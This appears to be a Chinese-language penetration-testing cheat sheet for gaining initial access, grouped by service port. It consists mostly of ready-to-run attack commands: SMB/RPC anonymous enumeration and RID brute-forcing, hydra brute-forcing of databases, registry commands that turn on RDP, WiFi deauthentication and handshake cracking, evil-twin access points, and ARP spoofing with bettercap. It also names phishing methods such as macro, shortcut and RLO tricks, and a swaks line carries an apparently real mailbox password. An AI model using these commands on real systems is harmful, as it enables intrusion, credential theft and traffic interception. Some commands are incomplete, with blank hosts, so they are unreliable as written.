# *打点（此阶段的目的是为了获得初始权限，方便后续操作。)

[TOC]

## 攻击侧重

## 

ftp(21)

ssh(22)

telnet(23)

smtp(25)

*http/https(80/443/8080)

*rpc,smb(135,139,445)

imap/imaps(143/993)

rdp(3389)

mysql(3306) mssql(1433) postgresql(5432) oracle(1521) mongodb(27017) redis(6379)



## web(80,443,8080)

目录扫描

gobuster dir -u http://192.168.17.140 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [-x php,txt,sql,rar,zip,tar]

dirsearch -u https://baidu.com -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt

dirb

御剑

JS信息搜集

JSFinder

LinkFinder

findsomething

cms识别

finger.tidesec.com #云悉指纹

fp.shuziguanxing.com #数字观心

github.com/TideSec/TideFinger #TideFinger (指纹识别工具) #(--主动搜集)

whatweb #(--主动搜集)

wappalyze #浏览器插件 #(--主动搜集)

漏洞

sql

sqlmap

文件上传

Ehole imb-aascan awvs nexpose openvas owasp-zap 北极熊 nikto bef sn1per nessus 

Ldb wafw00f curl whatweb webdev testdev cadaver wpscan wfuzz fuff gobuster feroxbuster dirsearch dirb 御剑

http get post 格式

curl http://.../... | html2txt

浏览器控制台

user-ageint : navigator.useragent

caido 类burpsuite

源码备份文件

.rar .zip .7z .tar.gz .bak .txt .old .temp .phps .sql

/.git/ https://github.com/lijiejie/GitHack #githack

svn https://github.com/callmefeifei/SvnHack #svnhack

github源码泄露

api与js信息

https://github.com/rtcatc/Packer-Fuzzer #packer-fuzzer

https://github.com/pingc0y/URLFinder #urlfinder

https://github.com/Threezh1/JSFinder #JSFinder

web漏洞扫描

EHole,IBM APPScan,awVs,nexpose,OpenVAS,owasp ZAP,北极熊,Nikto,BEFF,sn1per,nessus

ids/ips

ldb <域名>

wafw00f <域名>

curl 

whatweb

指纹识别

whatweb -v 10.129.211.253

dev

webdev

testdev

cadaver

whatweb

cms and oa and crm and erp

wpscan(wordpress)

wordpress

dolphin cms

wfuzz

nuclie

parsero robots文件遍历

arp-scan

arp-scan --interface=eth0 192.168.10.1/24



## smb,rpc(135,139,445)(*横向*)

开启smb服务

impacket-smbserver guest . -smb2support

impacket-smbserver guest . -username admin -password passwd -smb2support

列出共享(判断能否匿名登录)

nxc smb 192.168.12.130 -u '' -p '' --shares #空用户名，空密码

nxc smb 192.168.12.130 -u anonymous -p '' --shares #anonymous用户名，空密码

nxc smb 192.168.12.130 -u admin -p 'passwd' --shares #用户名，密码

smbclient -L 192.168.12.130 -U '' -N #空用户名，空密码

smbclient -L 192.168.12.130 -U anonymous -N #anonymous用户名，空密码

smbclient -L 192.168.12.130 -U admin%'passwd' #用户名，密码

smbmap -u '' -p '' -H 192.168.12.130 #空用户名，空密码

smbmap -u anonymous -p '' -H 192.168.12.130 #anonymous用户名，空密码

smbmap -u admin -p passwd -H 192.168.12.130 #用户名，密码

smb匿名登录(交互连接)

impacket-smbclient ''@192.168.12.130 -no-pass #空用户名，空密码

impacket-smbclient anonymous@192.168.12.130 -no-pass #anonymous用户名，空密码

: shares : use IPC$ : help

smbclient //192.168.12.130/GUEST -U '' -N #空用户名，空密码

smbclient //192.168.12.130/GUEST -U anonymous -N #anonymous用户名，空密码

: help : mget : mput

smb实名登录(交互连接)

impacket-smbclient admin:passwd@192.168.12.130 -no-pass

: shares : use IPC$ : help

smbclient //192.168.12.130/GUEST -U admin%'passwd'

: help : mget : mput

net use \\192.168.12.130\IPC$ passwd /user:admin

net use

net view \\192.168.12.130

net use \\192.168.12.130\GUEST

dir \\192.168.12.130\GUEST

copy : dir : type : schtasks

net use \\192.168.12.130\IPC$ /del

rpc匿名登录

rpcclient 192.168.12.5 -U '' -N

help : enumdomusers : enumdomgroups : enumdomains

rpc实名登录

rpcclient -U win2019%'root' 192.168.12.5

help : enumdomusers : enumdomgroups : enumdomains

impacket-rpcdump win2019:'root'@192.168.12.5

SID枚举/RID枚举

impacket-rpcmap -brute-opnums -opnum-max 64 -auth-level 1 'ncacn_np:192.168.12.5[\pipe\samr]' samr操作数枚举

impacket-rpcmap -brute-opnums -opnum-max 64 -auth-level 1 'ncacn_np:192.168.12.5[\pipe\lsarpc]' lsarpc操作数枚举

impacket-samrdump two.com/win2019:'root'@192.168.12.5 #samr

impacket-lookupsid two.com/win2019:'root'@192.168.12.5 #lsarpc

nxc smb 192.168.12.5 192.168.12.5 -u win2019 -p root --rid-brute

enum4linux-ng -u win2019 -p root 192.168.12.5 -U -R

rpcclient $> enumdomains ; lookupdomain ; lookupsids ; lookupsids S-1-5-21-873118422-227618334-1429070027-1000/1001/1002 ; lookupnames win2019

## ftp(21),mstsc(3389),smtp(25),imap/imaps(143/993),rstp(554)

------

ftp(21)

ftp登录

ftp anonymous@192.168.12.1

ftp文件下载

binary #传输二进制文件

prompt #不需要对每一个进行确认

mget * #下载

mput xx.txt #上传

wget -m ftp://anonymous:qwe@10.10.10.211 #-m(详细递归)

------

mstsc(3389)

开启远程mstsc服务

wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 #开启远程3389

wmic /namespace:\\root\cimv2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1 #开启远程3389

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f #开启远程3389

powershell -Command "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name fDenyTSConnections -Value 0" #开启远程3389

连接远程mstsc服务

apt install remmina remmina-plugin-rdp #remmina

rdesktop -u admin -p password -g 1366x768 192.168.1.100 #rdesktop

xfreerdp /v:192.168.1.100 /u:Administrator /p:password /size:1920x1080 #xfreerdp

------

smtp(25),imap/imaps(143/993) #邮件发送/接收协议

发送邮件

swaks --to 1918626596@qq.com --from qwe18230138770@163.com --server smtp.163.com --auth LOGIN --auth-user qwe18230138770@163.com --auth-password AHbgQ7d85AUXFUe2 --tls --body "i see you" --header "Subject:look"

------

rstp(554)

vlc 摄像头流媒体

## ssh

sudo sshpass -p 'xx' ssh xx@xxx.xxx.xxx.xxx





## mysql(3306),mssql(1433),postgresql(5432),oracle(1521),mongodb(27017),redis(6379)

数据库大多数需要127.0.0.1的地址来进行连接

ew_for_Win.exe -s lcx_tran -l 10000 -f 127.0.0.1 -g 3306

mysql(3306)

hydra -L users.txt -P passwords.txt  mysql

ew_for_Win.exe -s lcx_tran -l 10000 -f 127.0.0.1 -g 3306

mysql -h 192.168.12.1 -P 10000 -u root -p"rootroot" [-e "show databases;"] [--skip-ssl]

mssql(1433)

hydra -L sa -P passwords.txt  mssql

mssql-cli -S localhost -U sa -P password -d master

sqsh -S server -U username -P password

postgresql(5432)

hydra -L users.txt -P passwords.txt  postgres

psql -h  -p 5432 -U  -d 

PGPASSWORD=your_password psql -h localhost -U postgres

oracle(1521)

hydra -L users.txt -P passwords.txt  oracle-listener

sqlplus username/password@//host:1521/service_name# 示例

sqlplus system/oracle@//localhost:1521/ORCL

mongodb(27017)

\# 默认可能无认证，直接尝试连接

mongo --host  --port 27017# 如果有认证

mongo "mongodb://username:password@:27017"# 使用自动化工具

nmap -p 27017 --script mongodb-brute 

\# 旧版（MongoDB 4.x及以下）

mongo --host  --port 27017 -u  -p # 新版（MongoDB 5.x+）

mongosh "mongodb://username:password@host:27017/database"# 无认证连接

mongosh --host localhost --port 27017# 指定认证数据库

mongosh --host localhost -u admin -p password --authenticationDatabase admin

redis(6379)

hydra -P passwords.txt redis://:6379

ew_for_Win.exe -s lcx_tran -l 10000 -f 127.0.0.1 -g 6379

redis-cli -h 192.168.12.1 -p 10000 [-a "yourpassword"] [--raw] #匿名登录 -a指定密码 --raw 避免中文乱码

info #查看基本信息

SCAN 0 COUNT 10 #查看所有键值







## 社会工程学（网络钓鱼，短信钓鱼，电信钓鱼，冒充），wifi攻击，

setoolkit

steghide 隐写术

foremost 取证

templail

Sherlock #社交媒体搜索

全国列车时刻表

www.airliners.net/search #飞机型号

zh.flightaware.com #飞机实时航线

suncalc.org

配音口袋

剪映专业版

ps

blander

gimp

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215230330_1337.jpg)



grabaccess 

badusb

wifi破解

邪恶双生子

wifi钓鱼

rfid 

nfc 

id 

ic m1 密码破解 mifare classic tool

漏洞破解 pn532

无线电复制 门禁

硬件后门

软件无线电 SDR rtl_sdr

osint.org 开源情报网站

钓鱼攻击(swaks,Gophish,setoolkit)

邮件钓鱼

swaks

setoolkit

网站克隆

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215230330_1339.jpg)

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215230330_1341.jpg)![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215230330_1343.jpg)

原理：

自解压文件+RLO后缀名隐藏

快捷方式钓鱼

原理：

更改快捷方式的路径指向，从而达到运行后门木马效果

Word宏病毒

原理：（前提支持宏代码运行，代码运行导致执行系统命令，从而下载文件或者运行系统命令）

excel注入

excel运行特定cmd代码

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215230330_1345.jpg)

导致命令执行，使用curl远程下载文件并执行

WIFI攻击

------

wifi密码破解

开启(混杂模式)

airmon-ng start wlan0

开启网卡监听

airodump-ng wlan0mon

监听特定AP,等待握手包

airodump-ng -c 11 --bssid E6:DC:A5:94:5A:D9 -w onenight wlan0mon

攻击AP使其他人断线重连(抓握手包)

aireplay-ng -0 10 -a E6:DC:A5:94:5A:D9 -c xx:xx wlan0mon

跑字典

aircrack-ng -w /usr/share/wordlists/rockyou.txt onenight-01.cap

------

wifi中间人攻击

开启(混杂模式)

airmon-ng start wlan0

伪造企业wifi

airbase-ng -c 6 -e "vivo S16" wlan0mon

------

arp断网

arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 -c 5   #50毫秒发送一个包

arp欺骗

ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

wireshark截取流量

sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.100; set arp.spoof.fullduplex true; arp.spoof on; net.sniff on"

set arp.spoof.packet_rate 5  # 默认是30，降低到5-10

echo 1  > /proc/sys/net/ipv4/ip_forward

bettercap -iface eth0

arp.spoof.targets 192.168.1.100

net.sniff on